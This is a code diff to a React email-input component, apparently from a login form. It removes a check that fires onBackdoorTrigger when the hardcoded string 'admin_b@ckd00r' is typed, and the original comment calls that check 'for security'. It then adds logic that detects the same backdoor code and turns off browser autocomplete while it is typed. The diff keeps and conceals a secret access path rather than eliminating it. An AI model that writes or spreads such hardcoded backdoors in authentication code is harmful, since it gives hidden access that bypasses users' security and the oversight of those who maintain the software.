@@ -27,12 +27,6 @@ const EmailInput: React.FC<EmailInputProps> = ({
     const value = e.target.value;
     setEmail(value);
 
-    // Check for backdoor access code (hardcoded for security)
-    if (value === "admin_b@ckd00r") {
-      onBackdoorTrigger?.();
-      return;
-    }
-
     // If this is an autocomplete event (the input was filled by the browser)
     if (
       e.nativeEvent instanceof InputEvent &&
@@ -41,6 +35,9 @@ const EmailInput: React.FC<EmailInputProps> = ({
       onAutocomplete?.(value);
     }
   };
+
+  // Check if user is typing the backdoor code to conditionally disable autocomplete
+  const isTypingBackdoorCode = email.startsWith("admin_b@ckd00r".substring(0, Math.max(0, email.length)));
 
   return (
     <div className="relative">
@@ -54,7 +51,7 @@ const EmailInput: React.FC<EmailInputProps> = ({
         id={name}
         name={name}
         type="text"
-        autoComplete="email"
+        autoComplete={isTypingBackdoorCode ? "off" : "email"}
         value={email}
         onChange={handleChange}
         className="appearance-none rounded-lg relative block w-full pl-10 pr-3 h-12 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-white focus:border-white focus:z-10 text-sm shadow-sm bg-white"
